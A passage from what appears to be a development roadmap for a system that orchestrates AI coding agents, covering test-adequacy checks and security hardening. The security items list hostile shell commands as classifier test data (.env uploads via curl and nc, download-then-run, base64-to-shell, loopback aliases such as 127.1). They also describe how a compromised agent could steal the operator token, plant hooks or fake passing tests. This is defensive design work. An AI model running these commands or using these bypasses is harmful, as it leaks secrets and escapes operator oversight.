3. Add packages/shared/src/review-manifest.ts: an `acc-review` fence {issues[{id,severity,path,line,fix}],previous[{id,status}]} read with the readManifest pattern, with the ## Issues prose as fallback. reviewer.md is updated. The issues are persisted in a review_issues table, open blocking issues go to the fixer by id, and the review/verify branch of signatureOf hashes the open blocking issue ids.

**Done when:**

All of the following hold:
- A fix-stage prompt for a task whose unit and e2e commands both failed names both commands' failing ids, with a per-failure message and frame.
- Two failed runs with the same failing ids but different 80-line tails give the same Chairman signature (unit test).
- A reviewer report with an acc-review block creates review_issues rows, and a second review that marks them resolved changes the signature and the fixer context.
- test-summary has fixture tests for every supported runner.
- A report without the block behaves exactly as today.

**Check before building:**

The parsers depend on stack-trace and assertion output formats that are not contractual and change between versions:
- Vitest, Jest, pytest (-rA / --tb=short), Playwright line reporter, `go test`, `cargo test` and dotnet.
- They must degrade to today's tail.

There are no third-party services.

### VER-3 · Test adequacy: do the new tests fail without the change?

**Next** · Effort L · Impact 4/5 · Needs: REL-1

When a task adds or changes tests, the Control Center runs just those test files against the original code in a throwaway copy. A test that already passes there does not prove the change, and the reviewer, the verifier and the report say so. Later, it reads the coverage report the test command already writes and says which changed lines no test exercised. Both are advisory unless a repository opts in, so they catch tests that test nothing without slowing or blocking tasks by default.

**Verified gap:**

Confirmed: nothing checks whether new or changed tests fail on the old code, and nothing reads coverage.
- A grep for lcov, cobertura, coverprofile, istanbul or fail_to_pass across apps/orchestrator/src, packages/tools/src and packages/shared/src finds nothing. The only 'coverage' is review diff coverage in context.ts and stage-team.ts.
- BaselineChecks (engine/baseline-checks.ts) runs only to classify a failure (classify :71) and never with the task's test files applied.

Corrections to the proposal:
1.

**First steps**

1. Add engine/test-adequacy.ts. From pathStatusSince, take the changed test files (added or modified, matching the TEST_FILE rule, at most 50). Create a baseline detached worktree through a helper extracted from BaselineChecks.run, copy the task's versions of those files in, and link node_modules when the lockfile is unchanged, otherwise use prepareDetached. Run targetedCommand on those files at baseline and classify each file: fails_at_baseline, passes_at_baseline, or does_not_load (no totals).
2. In runners.ts, on the tests-stage success path (:965-974), run it once per distinct set of changed test files, cached by tree_id. Store the result in a new test_runs.adequacy column or a task_adequacy table (migration 20). Render it in context.ts testResults (for example 'these 2 new test files pass without your change') and in report.ts Verification coverage as advisory.
3. Later slice: an optional `coverageReport` path on repositoryCommandSchema. After a passing test run, engine/coverage.ts parses lcov and Istanbul JSON and intersects them with `git diff -U0 <baseline>` changed lines, giving 'changed lines covered 38/52' plus the uncovered hunks.

**Done when:**

On fixture repositories run by the e2e harness:
- A task adding a Vitest test that asserts new behaviour shows 'fails without the change: 1 file' in the Tests tab.
- A task whose added test also passes on the baseline shows 'passes without your change' in the reviewer and verifier prompts and an advisory line in final-report.md.
- A test importing a new module shows 'inconclusive: does not load on the original code'.
- The operator's checkout is untouched, and the baseline worktree is removed.
- With coverageReport set, the report states covered versus changed lines.

**Check before building:**

Coverage output depends on third-party tools:
- Vitest needs @vitest/coverage-v8 or @vitest/coverage-istanbul installed.
- Jest has --coverage with lcov and json reporters.
- pytest needs the pytest-cov plugin.
- Go uses -coverprofile.

The formats to parse are lcov SF/DA records, Istanbul coverage-final.json, Cobertura XML and Go coverprofile. Paths may be absolute or Windows-style and need normalising to repository-relative paths.

The `--` argument pass-through for pnpm and yarn must be confirmed per package manager (I09).

### VER-4 · Repository test health: readiness check, main-branch sentinel and flaky ledger

**Next** · Effort L · Impact 4/5 · Needs: nothing first

After a repository is added or cloned, one click runs every configured check and the App check once in an isolated copy. The operator then learns before the first real task whether main is red, which checks are slow and whether the app starts, and can apply suggested timeouts and settings in one step. Later, when main moves, the same checks run in the background while nothing else is running, so tasks classify pre-existing failures instantly, and a newly broken main raises one alert and one draft task. A cross-task ledger remembers which tests are flaky or already failing, for display and for ordering re-runs only.

**Verified gap:**

Confirmed:
- detectTooling only reads files (services/repositories.ts:67-121), and redetect re-reads them (routes.ts:483). No route runs a repository command outside a task (repository routes are routes.ts:477-495 only).
- BaselineChecks runs only when a task's command fails (baseline-checks.ts:71-110).
- Flaky and pre-existing classification is stored per task on test_runs.classification (migrations.ts:1205).
- A grep for readiness, suite_runs, test_health, quarantine or 'known flaky' finds nothing.
- AFFECTED_TESTS_PLAN.md:254 proposes the whole-suite safety net as the next task.

**First steps**

1. Add workflows/repository-check.yaml: a tests stage running every enabled kind, then verify, with no agent stages. Mark it hidden in services/workflows.ts and the New Task picker. Add POST /api/repositories/:id/check, which creates a worktree task on HEAD, and a 'Check this repository' button on RepositoryDetailPage offered after Add/Clone.
2. In runners.ts, when a task has no changes (pathStatusSince is empty) and a command fails, save the result directly into baseline_checks for that commit instead of calling BaselineChecks.classify. Later tasks on the commit then classify pre-existing failures from the cache.
3. Produce a readiness summary artifact: measured duration → suggested timeoutSec (3×), preexistingFailures and testSelection suggestions, and whether the app started. An 'Apply suggestions' action uses the existing PATCH /api/repositories/:id. The sentinel (SafetyNetService on the syncAll fast-forward, with its own suite_runs table and log files) follows as the next PR.

**Done when:**

The readiness check:
- After adding a fixture repository, 'Check this repository' produces one task whose report lists each command's result and duration and whether the app started.
- Suggestions apply in one click.
- A later real task on the same commit classifies a pre-existing failure from baseline_checks without creating a baseline worktree, which the logs show.

The sentinel:
- A fast-forward that introduces a failing test yields exactly one alert and one DRAFT task naming the commit range.
- A failure that passes on re-run yields none.
- It never runs while a task of that repository is in tests or verify, and never runs a command that needs approval.

**Check before building:**

- Git remotes must be reachable for the 15-minute fetch, which exists already.
- No third-party APIs are involved.
- If git bisect is ever automated, it must stay optional, because it assumes deterministic tests.

### VER-5 · Plan contract: declared proofs, plan coverage and plan-caused rerouting

**Next** · Effort XL · Impact 4/5 · Needs: nothing first

The planner adds a small fenced block naming how each success criterion is proven: a configured check, a test file, or a page of the app. The orchestrator runs those itself and shows the verifier what was declared next to what it observed, and after Implement it reports which planned files were left untouched and which unplanned files were changed. A review or verification that says CAUSE: plan then goes back to the planner, bounded and counted, on unsupervised tasks too, instead of being sent to the fixer. An optional cross-provider critique stage and path-conditional stages come later, and the conditional stages can never skip the tests stage or a review.

**Verified gap:**

The gap is real. It is narrower than stated in a few places.

Confirmed:
- stageDefinitionSchema has only next, onFail, optional and requires (packages/shared/src/schemas.ts:98-131). There is no `when` and no onPlanFail.
- handleOutcome always takes def.onFail for unsupervised tasks (apps/orchestrator/src/engine/engine.ts:1293-1327).
- causeMarker (chairman/signatures.ts:93) and pointsAtPlan are used only by the Chairman: chairman.ts:287 and policy.ts:57 (plan_mismatch leads to replan).
- plan_review is requested only in Discuss First mode (engine.ts:1274-1289).

**First steps**

1. Add packages/shared/src/acceptance.ts. It defines an `acc-checks` fence with a Zod schema: at most 10 items of {kind:'command',commandId} | {kind:'page',path} | {kind:'tests',files}, each tied to a criterion number. readAcceptance() copies apps/orchestrator/src/engine/work-units.ts readManifest (last valid block, normalise, hash). prompts/planner.md asks for the block under ## Success Criteria.
2. In apps/orchestrator/src/engine/runners.ts, after the configured commands in runCommands (tests stage), run the declared command and tests items as 'Acceptance · …' test_runs through gateCommand/targetedCommand, and append the declared page paths to verifyApp's verify.web paths. Keep them advisory at first. context.ts testResults renders a declared-vs-observed table for the verifier, and report.ts lists declared-but-unobserved checks as limitations.
3. Add optional `onPlanFail` to stageDefinitionSchema, validated in workflow.ts so that the target is a planner-role stage and it is set only on verdict stages. handleOutcome (engine.ts:1293) reads causeMarker (moved to packages/shared) on verdict_fail and routes to the planner under a new tasks.plan_revisions counter (migration 20, default max 1), falling back to onFail when the cap is reached. Set it on normal-development.yaml and full-autopilot.yaml.

**Done when:**

All of the following hold:
- A plan with an acc-checks block naming a configured commandId and a page path produces 'Acceptance · …' rows in the Tests tab and a declared-vs-observed section in the verifier prompt.
- A declared check that was never observed appears as a limitation in final-report.md.
- On an unsupervised normal-development task, a review ending 'CAUSE: plan' returns to the plan stage exactly once and then falls back to fix. This is covered by an engine test.
- validateWorkflow rejects onPlanFail pointing at a non-planner stage, and rejects `when` on the tests stage or on a verdict stage.
- pnpm check is green.

**Check before building:**

- The 'other provider' default for the critic assumes the operator has both the Codex and Claude subscriptions signed in. If only one is healthy, the critic must run on the same provider or be skipped. It must never fall back to a paid API.
- A critique run consumes subscription quota and counts against usage-window limits.
- No third-party APIs are involved.

### VER-6 · Live smoke tests for production tool packs

**Next** · Effort M · Impact 3/5 · Needs: nothing first

Add an opt-in smoke suite that runs each tool pack's real write paths against real services: disposable Postgres, MySQL and Docker containers on the local machine, local D1 through Wrangler, and an optional preview Worker upload. Add one real tool call through the Codex and Claude MCP bridges. Several planned features (direct deploys, rollback, disposable databases, GitHub merges) build on operations that have only been tested on paper, so this catches broken operations before operators rely on them. A dated verified/unverified matrix replaces prose claims in the docs.

**Verified gap:** Confirmed. docs/plans/tool-layer-v2/PLAN.md:81 reads 'Wrangler, D1, Postgres and MySQL operations are built but were not run against real services', and :82 reads 'no device or Docker daemon was exercised'. :83 says Codex wiring was 'built, not run live'. The Found-for-Later rows at :113-116 list the Codex MCP bridge not run live, the packs not run against real services and the privileged helper never elevated. apps/orchestrator/test/tools.test.ts:367 is titled 'privileged helper validation (real PowerShell, never elevated here)' and only calls validate().

**First steps**

1. Local D1 and Docker smokes. Add apps/orchestrator/test/tools-live.test.ts, gated by ACC_LIVE_TOOLS=1. It creates a temporary wrangler project and calls cloudflare.d1_migrations, d1_query and d1_export with environment 'local' through /api/tools/call, checking that DROP TABLE asks for approval. It also runs docker.build, docker.run and docker.cleanup on a task-labelled container, with cleanup in afterAll.
2. Postgres and MySQL smokes. In the same suite, start postgres and mysql containers bound to 127.0.0.1, store a runtime-assembled DSN as a broker credential, and exercise a read-only query, a Level 3 write and a destructive statement that must ask. Skip with a reason when psql or mysql is missing.
3. Bridge probes and matrix. Extend scripts/verify-agents.ts `--run` with a bridge probe per agent that asks it to call one harmless acc capability and asserts a tool_executions row. Add `pnpm verify:tools`, which prints a dated verified/unverified matrix, point docs/systems/tool-system.md and docs/systems/mcp.md at it, and add the privileged-helper checklist to docs/systems/operations.md.

**Done when:** On a machine with Docker, psql and mysql, `ACC_LIVE_TOOLS=1 pnpm vitest run apps/orchestrator/test/tools-live.test.ts` passes, leaves no containers, and shows destructive SQL waiting for approval. Without them it skips with named reasons. `pnpm verify:agents --run` reports one successful acc tool call through Codex and one through Claude, each with its tool_executions row. `pnpm verify:tools` prints each pack operation as verified (with date) or unverified, and tool-layer-v2/PLAN.md rows 113-116 are updated from its output.

**Check before building:**

To confirm:
- Docker Desktop (WSL2 backend) exists on the Windows 11 machine.
- The psql and mysql client binaries are on PATH. The packs call local clients, so a container alone is not enough.
- `wrangler d1 execute/migrations/export --local` works on Windows through workerd and miniflare without Cloudflare credentials.
- `wrangler versions upload` needs the Worker to already exist.
- The installed Codex CLI version accepts `-c mcp_servers.<name>.command/args/env_vars`, and the ChatGPT account has allowance. PLAN.md:114 says the CLI was too old and had no credits.
- An Android emulator or AVD is optional and skipped when absent.

### VER-7 · App check that really runs: more app types, signed-in pages, a11y and baseline comparison

**Later** · Effort XL · Impact 4/5 · Needs: nothing first

The App check learns to start more kinds of apps (Playwright webServer, dev:full, Astro, Remix, SvelteKit, Nuxt, FastAPI, Flask, Django, .NET). It can check pages behind a login by reusing a sign-in the operator records once, never a password in a prompt. It can also run short click-through flows and seed test data first. It adds accessibility results and, on request, compares the task's app with the original version for new WCAG violations, visual breaks and slower pages, so UI regressions stop passing unnoticed.

**Verified gap:**

Confirmed:
- detectTooling proposes a start command only for scripts.dev running vite, next dev or wrangler dev, on the fixed VERIFY_PORT 5199 (services/repositories.ts:56, :90-98).
- For Python it records tooling only and adds no commands (:112). There is no .NET or Playwright webServer detection; grepping webServer or dev:full in apps/orchestrator/src finds nothing.
- repositoryRuntimeSchema has only devCommand, devUrl, readyTimeoutSec, verifyPaths and verifyMode (packages/shared/src/tools.ts:307-317). There are no flows, fixtures, session or multiple apps.

**First steps**

1. Extend detectTooling (services/repositories.ts:67-121) to cover dev:full and start scripts, astro, remix, sveltekit and nuxt, and playwright.config webServer.command/url read as text. Add uvicorn, flask and django start commands, pytest, ruff and mypy commands, and `dotnet test`. Unit tests use fixture repositories.
2. Add an optional `session` (saved session name) and `flows` (browser.run_flow step union) to repositoryRuntimeSchema. Pass `session` through verify.web to checkPage/checkAt newContext({storageState}), allowed only for loopback URLs, and run flows in verifyApp (runners.ts:1250) through ToolService.invoke('browser.run_flow'). RepositoryDetailPage gets a 'Record sign-in' action (browser.open visible, then browser.close saveSession).
3. Make verify.web run axe per page (reusing the browser.accessibility code) and list violations in browser-verification.md. A later verify.compare starts the baseline commit's app in a detached worktree on the same port after the head app stops, and reports new axe violations, a canvas pixel diff and timing deltas as advisory.

**Done when:**

All of the following hold:
- detectTooling proposes working start commands for Playwright-webServer, FastAPI and .NET fixture repositories.
- A fixture app with a login-protected page passes the App check using a recorded session, and a leak test shows no cookie or credential in prompts, logs or artifacts.
- A configured flow runs in the App check with step screenshots in browser-verification.md.
- axe violations appear per page.
- A fixture change that adds a WCAG violation is flagged 'new versus baseline' (advisory) by verify.compare.

**Check before building:**

Start detection depends on each framework's dev-server CLI flags for host and port:
- astro dev --port, remix/sveltekit (vite) --port --strictPort, nuxt dev --port.
- uvicorn --host --port, flask run --port, django runserver 127.0.0.1:PORT, dotnet run --urls.

playwright.config webServer may be an array or computed, so reading it as text will miss some cases.

Other assumptions:
- Playwright storageState cookies expire, so a session needs a 'still signed in' check such as an expect_url step.
- axe-core rule results should be deterministic within one pinned version.
- Pixel diffs need masks and thresholds for dynamic content.

### VER-8 · Disposable test databases per task (local containers first)

**Later** · Effort L · Impact 3/5 · Needs: nothing first

A repository can declare the backing services its tests need (Postgres, Redis, MySQL). Each task then gets its own throwaway container on 127.0.0.1, and its connection string is passed only to the tests stage and App check. Integration tests then really run, and never against the operator's own database. The tests stage can also apply the repository's migrations to that fresh database first, which puts 'migrations apply cleanly' on the release card as advisory evidence. Neon and Supabase branch providers come in a later step, once brokered credential kinds and a cost cap exist.

**Verified gap:** The tests stage builds its environment only from sanitizeEnv(this.d.baseEnv, billingMode) (engine/runners.ts:743), and nothing provisions or injects a service. The env guard always strips DATABASE_URL, PGPASSWORD, MYSQL_PWD, MONGODB_URI, REDIS_URL and SUPABASE_ACCESS_TOKEN (packages/security/src/env-guard.ts:91-100,132-145). So environment-variable-based integration tests fail, while a dotenv file in a non-worktree checkout can still point tests at the operator's development database.

**First steps**

1. Add a repository `services` setting ([{name, kind: postgres|redis|mysql, image pinned by digest, envVar, stages}]) to packages/shared/src/schemas.ts updateRepositorySchema (:274), an append-only migration 20 creating task_services in apps/orchestrator/src/db/migrations.ts, and packages/tools/src/packs/services.ts with services.provision, services.status and services.teardown (Level 2, docker with the acc.task label, random free loopback port, generated password registered with the redactor), registered in packages/tools/src/index.ts builtinProviders.
2. In engine/runners.ts runCommands (:743), provision the stage's services through ToolService.invoke (origin 'engine') after sanitizeEnv and add their variables to that stage's env only. Pass them to App check through ProcessHost.start env from the engine scope (packages/tools/src/packs/verify.ts:33). Tear down in engine/tooling.ts cleanup (:513-531) and add a sweep of containers left by finished or crashed tasks in app.ts recover (:241-255). Add tests that agents and other stages still get no DATABASE_URL and that the password is redacted.
3. Add a 'migrate' command kind (packages/shared/src/constants.ts:190) that the tests stage runs first against the fresh database. It is recorded as a TestRun so it is tied to the tested tree, and release/service.ts describe() (:195) shows it as advisory evidence. Leave precheck (:653) and the manualPaths refusal unchanged.

**Done when:** Take a repository with a Postgres service configured. A task's tests stage runs its migrate command and then its tests against a fresh container on 127.0.0.1. DATABASE_URL is present in that stage's commands and the App check process, and absent from agent processes and other stages. The container is gone after the task completes, after it is cancelled, and after an orchestrator crash and restart (sweep). The generated password never appears in logs, events or artifacts. The release card shows 'N migrations applied cleanly to an empty database at &lt;commit>'. Without Docker, the stage records a limitation instead of failing.

**Check before building:** Docker Desktop on Windows 11 requires WSL2 and a paid licence in larger organisations, and some operators will not have it; the stage must degrade to a recorded limitation. Neon: confirm the Branches API `init_source: 'schema-only'` availability and limits, project-scoped API keys, branch-count limits per plan and branch compute pricing. Supabase: branching needs a paid plan, is created through the Management API (POST /v1/projects/{ref}/branches), takes minutes to start and bills per hour; its access token is account-wide. ORM behaviour: prisma `migrate deploy` works on an empty database, but `migrate dev` needs a shadow database.

## SEC — Security hardening

### SEC-1 · Close loopback-alias and exfiltration gaps; scan and gate git.push

**Now** · Effort M · Impact 5/5 · Needs: nothing first

An agent can reach the Control Center's own API through the tools today by writing 127.0.0.1 differently (127.1, 2130706433), because URLs are checked before Node normalises them. This fixes that first. git.push then checks outgoing commits for secrets, and a push to the repository's release branch is treated as a production deploy that needs a typed approval. Finally, the command classifier learns uploads of files, download-then-run across commands, and quiet data-loss commands, each with tests in both directions.

**Verified gap:**

I ran classifyCommand via tsx on these commands, and every one returned Level 2 'Local command':
- curl -d @.env, curl -F file=@.env, curl -T
- scp .env user@host:, rsync -a . host:, nc host 443 &lt; .env, Invoke-RestMethod -InFile .env
- curl -o x.sh … && sh x.sh, and the same with ; bash x.sh
- find . -delete, git gc --prune=now, git reflog expire --all
- eval "$(cat x)", source &lt;(curl …), echo … | base64 -d | sh
- npx some-pkg, pnpm dlx pkg
- curl http://127.1:4317/ and curl http://2130706433:4317/

git push origin main and gh pr merge are Level 3.

**First steps**

1. Normalise every URL input with new URL(u).href before the referencesSelf check in ToolService.invoke (service.ts:462) and on guardedFetch's first hop (net-guard.ts:46). Add a loopback-alias matcher with port in commands.ts setSelfReferences (127/8 shorthand, decimal, hex, octal, ::ffff:127.0.0.1 and ::ffff:7f00:1). Tests go in apps/orchestrator/test/audit-fixes.test.ts and packages/security/test/audit-classifier.test.ts.
2. Move the preflight core into packages/git. git.push (packs/git.ts:314) runs scanOutgoing on the tip against the remote branch and fails with a named finding. Its classify escalates to Level 5 production when the branch is the repository's release branch (passed in the classify context) or matches PRODUCTION_BRANCH. Keep 'gh pr merge' and 'git push &lt;remote> &lt;release-branch>' in Claude's Level 3 denies (index.ts:143-144).
3. Add PATTERNS: file uploads (Level 3 network; Level 4 credentials when the file matches sensitiveFileReason or .env), remote copy tools, segment-aware download then run, git gc --prune=now, reflog expire, find -delete (Level 3 in cwd), eval / source &lt;(…) / base64 -d | sh. Each gets positive and negative tests.

**Done when:** Agent http.request and web.read to http://127.1:4317/, http://2130706433:4317/ and http://[::ffff:127.0.0.1]:4317/ are denied as self-references, while http://127.0.0.1:9/ still runs. git.push of a commit containing a runtime-assembled token fails and names the rule. git.push to main in a repository whose release branch is main needs a typed Level 5 approval, while feature branches stay Level 3. Every new classifier rule has a test in each direction, and pnpm check is green.

**Check before building:** Which Git-connected hosts deploy on a push to a given branch (per repository; Pages, Vercel, Netlify). gh CLI subcommand spellings. The WHATWG loopback normalisation was verified locally with Node's URL.

### SEC-2 · Repository trust scan and fenced external content for agents

**Now** · Effort L · Impact 5/5 · Needs: nothing first

A downloaded repository, or a file an earlier agent wrote into the worktree, can today make Claude run arbitrary hooks or point it at another API endpoint, with no check. This adds a read-only trust scan of agent config, instruction files, install scripts and editor tasks. It runs after clone, and again before every Claude launch against what the task itself changed. Untrusted or changed config is then left out of the run until a person trusts it. Separately, web pages, browser snapshots, remote HTTP bodies and issue text reach agents inside an 'untrusted data' fence with advisory injection notes. A taint policy that asks for approval before network writes after reading external content comes last, behind a setting.

**Verified gap:** Tool output reaches agents unfenced. apps/orchestrator/src/tools/service.ts:709-721 formatForModel has no fence, and tool-routes.ts:257 returns it to the agent. fenceEvidence (chairman/reasoner.ts:85) and checkLearnedText (learning/safety.ts:48) are used only by the Chairman, Ask, the learning reviewer and connected apps. Neither PolicyInput (packages/tools/src/policy.ts:21-38) nor ToolScope has any taint concept; a grep found none. Repository config controls the agent.

**First steps**

1. New packages/tools/src/packs/repo-trust.ts `repo.trust_scan` (Level 1, reads only). It checks .claude/settings*.json (hooks; env incl. ANTHROPIC_BASE_URL and apiKeyHelper; permissions), .mcp.json, skills' allowed-tools, package.json pre/postinstall/prepare scripts through classifyCommand, .husky/.githooks, .vscode/tasks.json runOn folderOpen and devcontainer postCreateCommand. A new append-only repository_trust migration stores results. It runs after clone (services/repositories.ts:249) and on first task, and RepositoriesPage shows findings and a Trust button.
2. Before each Claude launch (engine/runners.ts ~:575), diff the worktree's agent-config files against the trusted baseline. When untrusted or changed by the task, launch without project/local setting sources plus a Control Center --settings file, emit an event, and have verify:agents confirm the subscription probe still passes.
3. Move fenceEvidence and checkLearnedText (as scanInjection) into packages/security. Add an externalContent flag on operation() for web.read, web.search, browser.*, remote http.request and github-api issue/PR reads. formatForModel (service.ts:709) fences those results and adds advisory notes.

**Done when:** A fixture repository with a .claude/settings.json SessionStart hook that writes a marker file shows the finding after clone, and a task's Claude run does not create the marker until the operator trusts the repository. A Codex or Claude stage that writes a hook into .claude/settings.json makes the next Claude stage launch without it, with an event naming the file. web.read output reaches the agent inside an untrusted-evidence fence with the 'data, never instructions' line. pnpm check and pnpm verify:agents stay green.

**Check before building:**

Confirm:
- The values --setting-sources accepts: can it be empty, or 'user' only?
- Whether CLAUDE.md, .claude/skills, .claude/agents and .claude/commands load independently of --setting-sources.
- Whether a project settings `env.ANTHROPIC_BASE_URL` takes effect with an OAuth subscription login, and whether the init event reveals it.
- Whether -p mode skips the workspace-trust dialog, so project hooks run unprompted.
- Whether Claude Code refuses edits to its own .claude/settings*.json in acceptEdits mode.
- The trust model of Codex project-level config (.codex/).

### SEC-3 · Guard Claude's native tools and decide the agent OS boundary

**Now** · Effort XL · Impact 5/5 · Needs: nothing first

Today Claude Code's own Bash and Read tools skip every Control Center check. An agent can read the data folder's auth-token or call the local API and act as the operator. This initiative first moves task worktrees out of the data folder, because their paths currently trip the self-reference rule. It then denies the secret files and the API port in Claude's permission rules and routes native Bash through a Control Center precheck hook that fails closed. The lasting fix is a boundary the operating system enforces. That is recorded as a decision: a separate low-privilege account, Claude's native sandbox, or Codex's sandbox as the only runner at Level 2 and above. The dashboard's token is then handed out only through a launch ticket, never to any loopback GET.

**Verified gap:** Confirmed in code. packages/agent-claude/src/index.ts:88 allows READ_TOOLS (Read, Grep, Glob, LS) at every level with no path rule. :96-121 ALWAYS_DENIED is only a list of git/rm prefixes, with no Bash(*auth-token*) or Bash(*127.0.0.1:&lt;port>*). :138-146 claudeToolPolicy allows native 'Bash' from Level 2. buildArgs (:419-452) passes no --settings and no hooks; the only --settings use is {disableAllHooks:true} for the skills lookup (:378). The self-reference refusal exists only for acc tool calls: apps/orchestrator/src/tools/service.ts:462-466 checks referencesSelf(JSON.stringify(input)).

**First steps**

1. Move task worktrees, workspaces and team-worktrees to a work root outside the data folder (engine/tooling.ts:387-395, engine/stage-team.ts:170, config.ts), migrating existing ones with `git worktree move`. Carve learned plugins (learning/skills.ts:95) out as a read-only exception. Add tests that an absolute worktree path is no self-reference, while auth-token, the *.db files, the key files and the port still are.
2. packages/agent-claude/src/index.ts: add disallowedTools derived from the real data folder and port. Target the secret files only, e.g. Read(&lt;dataDir>/auth-token), Read(&lt;dataDir>/*.db*), Read(**/credential-key*), Read(**/privileged-key*), Bash(*auth-token*), Bash(*127.0.0.1:&lt;port>*), Bash(*localhost:&lt;port>*). Add a --settings PreToolUse hook for Bash only that POSTs to a new /api/tool-session/precheck (tool-routes.ts beside :250). The hook runs ToolService.precheck, which is classifyCommand + referencesSelf + decide() with origin 'agent', fails closed, and records only denials as native.bash tool_executions rows.
3. Independent small fixes: keep a rolling redaction tail across chunks in packages/pty/src/index.ts:114; correct docs/systems/security.md:70-76; add a scripts/verify-agents.ts --run check that `cat <dataDir>/auth-token`, Read of it, and `curl http://127.0.0.1:<port>/` are refused inside a real Level 2 Claude run. Write the OS-boundary decision record in security.md.

**Done when:** In a real Level 2 Claude run (pnpm verify:agents --run), reading auth-token with Read or Bash, curl to the orchestrator port, and node -e fetch to http://127.1:&lt;port>/ are refused with the Control Center's reason, and a denied tool_executions row is written. Reads, edits and test commands using absolute worktree paths still work. With the orchestrator unreachable, native Bash is refused. security.md names the chosen OS boundary. In that mode, reading auth-token inside a run fails with an OS access-denied, and GET / without a launch ticket returns no token.

**Check before building:**

Confirm the following for the pinned CLI versions:
- Claude Code PreToolUse contract: stdin JSON with tool_name and tool_input; exit 2 or permissionDecision 'deny' blocks and the reason reaches the model.
- Hooks from --settings run in -p mode with --permission-prompts none.
- Whether project or local disableAllHooks, or a mid-run edit of .claude/settings.local.json, can disable flag-settings hooks, or whether hooks are snapshotted at startup.
- Whether an 'http' hook type exists, which would avoid a node spawn on every Bash call on Windows.

### SEC-4 · Host-bound credentials and outbound secret checks on the tool door

**Now** · Effort L · Impact 4/5 · Needs: nothing first

Each stored credential gets an audience, the hosts it may be sent to, with defaults by kind. A prompt-injected agent can then no longer send a GitHub or Cloudflare token to any URL with a Level 1 GET. The redactor learns more token formats and the base64, hex and percent-encoded forms of every registered secret. Every outbound tool request (http, web.read, web.search, MCP arguments) is also checked for secrets before it leaves: agents are refused, operators are asked. Claude's native shell remains out of reach until I21.

**Verified gap:** packages/tools/src/packs/http.ts:52-58: classifyRequest rates any GET Level 1 whether or not it carries auth. :79-85 authHeaders sends any in-scope credential by name to input.url. packages/tools/src/sdk.ts:119-121 CredentialHost.value(name) takes no target, and apps/orchestrator/src/tools/credentials.ts:635-645 value() checks only scope, reserved and held-for-vault. docs/systems/credential-broker.md:190 admits the gap: 'it can already send any in-scope credential with http.request'. A grep for audience/allowedHosts finds nothing relevant.

**First steps**

1. Credential audience: a new migration adds audience (JSON host list) to credential_references, with defaults by kind. CredentialHost.value(name, {targetUrl}) is added in packages/tools/src/sdk.ts and apps/orchestrator/src/tools/credentials.ts:635, and http.ts authHeaders passes input.url. classifyRequest raises auth-bearing remote calls to Level 3 with a 'credentials' effect. A request outside the audience is denied for agents and needs approval for operators. Existing http credentials migrate to 'any host (review)' with a CredentialsTab warning.
2. packages/security/src/redact.ts: add blocking rules for the listed prefixes, plus base64/base64url/hex/percent variants of registered values and the local token, capped in length. Tests in packages/security/test use runtime-assembled values.
3. New packages/security/src/dlp.ts scanOutbound({url, headers, body}), applied in http.ts viaFetch/curl, web.ts web.read/web.search, and the MCP provider run before callTool (mcp.ts:130-134). Findings (kind and host, never the value) deny agent calls, need approval for operators, and are recorded as TOOL_CALL events. (secret, host) pairs within the audience are exempt.

**Done when:**

Tests show the following:
- An agent http.request GET to an unrelated host with a github-kind auth.credential is denied, and the operator gets an approval.
- The same request to api.github.com runs.
- A URL, body, search query or MCP argument that carries a registered secret, or its base64/hex/percent form, is denied for agents. The TOOL_CALL event names the kind and host, not the value.
- Each new token format and encoded variant is redacted.
- A pre-existing custom-host http credential still works and shows a review warning.

**Check before building:** Current token formats for Hugging Face (hf_), PyPI (pypi-AgEIcHlwaS5vcmc…), SendGrid (SG.x.y), Shopify (shpat_/shpca_/shpss_), Supabase (sbp_), Sentry (sntrys_/sntryu_), Linear (lin_api_) and Telegram bot tokens. Default API hostnames per kind (api.cloudflare.com; api.github.com, uploads.github.com, github.com; registry.npmjs.org), with GitHub Enterprise hosts left for the operator to set. IDN/punycode normalisation via WHATWG URL. Whether Codex's workspace-write sandbox blocks network on Windows, which decides how much of Codex egress the tool door covers.

### SEC-5 · Assume-breach security regression suite

**Next** · Effort M · Impact 4/5 · Needs: nothing first

A test suite plays a fully compromised agent and records what it actually achieves. The scripted attacks are: read the token or data folder, reach the local API through loopback aliases, send a credential to a foreign host, upload a .env file, push to the release branch, plant agent hooks in the worktree, claim PASS without tests, and flood tool calls. Each outcome is checked against a committed ratchet file that marks every step as denied, needs approval, redacted, or a known exposure with an owner. A leak-canary sweep then scans every database column, data-folder file, cloud frame, alert and log line for planted secrets and their encodings. Guards can only get tighter: any regression or unrecorded fix turns the build red, and the docs point to the ratchet instead of prose promises.

**Verified gap:** Partly built. apps/orchestrator/test/remote-egress.test.ts:48-80 already runs a runtime-assembled canary sweep of one sink: the cloud wire (the local token, an env secret, a broker credential value and every path spelling across FakeRelay frames). alerts.test.ts:182-186 checks one messenger body. audit-fixes.test.ts:49-70 covers F-02 as single ToolService.invoke denials. Missing: (1) Scenarios for work roles. SimulatedAgentAdapter calls tools only in the 'ask' case through [sim:lookup] (packages/agent-sdk/src/simulated.ts:377-397); no work-role playbook exists.

**First steps**

1. Add apps/orchestrator/test/security/hostile-agent.ts, a test-only AgentAdapter whose playbooks call /api/tool-session/call through input.toolBridge. Add security-ratchet.json and security-ratchet.test.ts on a listening createTestApp (setListenUrl, bridgePath as in ask-data.test.ts:65-67). Cover: shell.run reading auth-token (denied), http.request to http://127.1:&lt;port>/ (known_exposure, owner I24), http.request POST of .env to a local fake host (known_exposure, owner I22/I24), git.push of the release branch (known_exposure, owner I24), and VERDICT: PASS with no test run (READY refused, F-06).
2. Add test/security/sweep.ts: walk every TEXT column from sqlite_master, every file under dataDir except the sealed key and credential store, FakeRelay frames, fake messenger captures and a pino capture stream (add a logger-stream option to http/server.ts buildServer). Plant canaries through a brokered credential echoed by a tool, an env var printed by a command, a fake stdio MCP server and agent output. Match raw and base64/hex/percent-encoded forms; the encoded forms start as known_exposure owned by I22.
3. Add ratchet entries over claudeToolPolicy() and the execution argv (agent-claude/src/index.ts:133-142, :443): native Read of &lt;dataDir>/auth-token and a Bash fetch of 127.0.0.1:&lt;port> are known_exposure (F-02, owner I21), and project .claude/settings.json hooks load during executions (known_exposure, owner I23). Add the 'known_exposure count may not rise' guard, run the suite in pnpm check with a nightly schedule in .github/workflows/ci.yml for the Windows/PTY variants, and change docs/systems/security.md:74-76 to cite the ratchet.

